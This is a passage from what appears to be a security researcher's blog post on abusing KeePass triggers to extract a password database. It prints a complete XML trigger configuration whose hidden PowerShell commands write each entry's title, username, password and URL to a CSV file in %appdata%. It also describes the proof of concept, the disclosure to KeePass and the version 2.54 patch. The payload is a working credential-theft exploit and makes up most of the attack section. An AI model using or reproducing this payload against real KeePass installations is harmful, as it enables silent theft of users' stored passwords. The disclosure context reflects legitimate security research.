  {CMD:&PowerShell.exe -C "$title='{REF:T@I:{CMD:/PowerShell.exe -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$user='{REF:U@I:{CMD:/PowerShell.exe -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$password=***REDACTED*** -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$url='{REF:A@I:{CMD:/PowerShell.exe -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$output=','+$title+','+$user+','+$password+','+$url;echo $output;if(!($title.StartsWith('{REF'))){ac -Path $env:APPDATA'\extract.csv' -Value $output;}else{echo 'stop';}"&M=C,W:0,O:1,WS=H&}
  
  
---|---  
`

### Creating the trigger __

Now that our two placeholders are ready, we can create a trigger to loop through their execution.

As told before, we choose “Time - Periodic” as the trigger event in order to loop through the code execution multiple times. While 1 or 2 seconds is enough for everything to execute, we choose 4 as a parameter. This is because sometimes trigger execution causes a little stutter in the GUI, and we want to make sure it does not interfere with the users actions.

[](/assets/img/blog/keepass_triggers/extract_trigger_event.png)

Both placeholders are inserted in the string value condition. As it is checked on every event, the code will be executed every 4 seconds.

[](/assets/img/blog/keepass_triggers/extract_trigger_stop_condition.png)

When the placeholders return _stop_ , the trigger is launched. Everything was already executed, so we don’t need any action and simply check _“Turn off after executing actions (run once)”_ to make sure no more command is going to be executed:

[](/assets/img/blog/keepass_triggers/extract_trigger_basic_parameters.png)

Nothing in the configuration file keeps the on/off state of the trigger, so it will be turned on again next time KeePass is launched. To avoid unexpected execution of the trigger in future KeePass launches, we can create a new trigger dedicated to observation, which will disable the extract trigger if `extract.txt` exists.

[](/assets/img/blog/keepass_triggers/watcher_trigger_order.png) _Creation of a watcher trigger, executed before the extraction one_

[](/assets/img/blog/keepass_triggers/watcher_trigger_event.png) _The trigger is executed immediatly when KeePass is opened_

[](/assets/img/blog/keepass_triggers/watcher_trigger_condition.png) _The trigger checks if an extract file already exists_

[](/assets/img/blog/keepass_triggers/watcher_trigger_action.png) _If the database was already extracted, disables the trigger._

Our final payload will be:

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  18
  19
  20
  21
  22
  23
  24
  25
  26
  27
  28
  29
  30
  31
  32
  33
  34
  35
  36
  37
  38
  39
  40
  41
  42
  43
  44
  45
  46
  47
  48
  49
  50
  51
  52
  53
  54
  55
  56
  

| 
  
  
  <Triggers>
  <Trigger>
  <Guid>nKQhMaPWI0StKa5oNXWEaQ==</Guid>
  <Name>watcher</Name>
  <TurnOffAfterAction>true</TurnOffAfterAction>
  <Events>
  <Event>
  <TypeGuid>2PMe6cxpSBuJxfzi6ktqlw==</TypeGuid>
  <Parameters />
  </Event>
  </Events>
  <Conditions>
  <Condition>
  <TypeGuid>y0qeNFaMTJWtZ00coQQZvA==</TypeGuid>
  <Parameters>
  <Parameter>%appdata%\extract.txt</Parameter>
  </Parameters>
  <Negate>false</Negate>
  </Condition>
  </Conditions>
  <Actions>
  <Action>
  <TypeGuid>tkamn96US7mbrjykfswQ6g==</TypeGuid>
  <Parameters>
  <Parameter>extract</Parameter>
  <Parameter>0</Parameter>
  </Parameters>
  </Action>
  </Actions>
  </Trigger>
  <Trigger>
  <Guid>Zomn/ZbbeE6fMGacmozGFw==</Guid>
  <Name>extract</Name>
  <TurnOffAfterAction>true</TurnOffAfterAction>
  <Events>
  <Event>
  <TypeGuid>bES7XfGLTA2IzmXm6a0pig==</TypeGuid>
  <Parameters>
  <Parameter>4</Parameter>
  <Parameter>False</Parameter>
  </Parameters>
  </Event>
  </Events>
  <Conditions>
  <Condition>
  <TypeGuid>uQ/4B3M4T+q7LrwL6juYww==</TypeGuid>
  <Parameters>
  <Parameter>{CMD:&amp;PowerShell.exe -C "$uid='{REF:I@I:0{CMD:/PowerShell.exe -C "$eus='';if (!(Test-Path $env:APPDATA'\extract.csv')){ni -itemType File -Path $env:APPDATA -Name 'extract.csv' | Out-Null;};foreach($line in gc $env:APPDATA'\extract.csv'){$eus+=' -'+$line.Split(',')[0];}echo $eus;"/M=C,W:0,O:1,WS=H/}}';echo $uid;if(!($uid.StartsWith('{REF'))){ac -Path $env:APPDATA'\extract.csv' -Value $uid -NoNewline;}"&amp;M=C,W:0,O:1,WS=H&amp;}{CMD:&amp;PowerShell.exe -C "$title='{REF:T@I:{CMD:/PowerShell.exe -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$user='{REF:U@I:{CMD:/PowerShell.exe -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$password=***REDACTED*** -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$url='{REF:A@I:{CMD:/PowerShell.exe -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$output=','+$title+','+$user+','+$password+','+$url;echo $output;if(!($title.StartsWith('{REF'))){ac -Path $env:APPDATA'\extract.csv' -Value $output;}else{echo 'stop';}"&amp;M=C,W:0,O:1,WS=H&amp;}</Parameter>
  <Parameter>0</Parameter>
  <Parameter>stop</Parameter>
  </Parameters>
  <Negate>false</Negate>
  </Condition>
  </Conditions>
  <Actions />
  </Trigger>
  
  
---|---  
`

### PoC time!__

Running it against our sample database, we observe that entries’ UUIDS are successfuly populated in`%appdata%\extract.txt` 🥳

[](/assets/img/blog/keepass_triggers/extracted_entries.png)

## Afterwords __

I contacted KeePass developers, which where already working on a fix. As a result, a patch was introduced in[version 2.54](https://keepass.info/news/n230603_2.54.html), released in June 2023. It includes a new way to manage triggers that forces them in the [enforced configuration file](https://keepass.info/help/kb/config_enf.html) (only accessible to privileged users).

The extraction technique still works, but now requires administrator privileges. As an attacker with such privileges could perform virtually any other extraction technique (e.g. malicious plugin, DLL injections..), I believe that this scenario should not be considered in KeePass threat model. In my opinion, monitoring the application directory for malicious uses seems more relevant.

PS: I may not have discovered the most efficient way to combine these KeePass features to extract passwords. If this post gave you ideas, feel free to reach me and improve the payloads together! I am easily reachable on Twitter and Discord, both shown on the left panel off the blog.
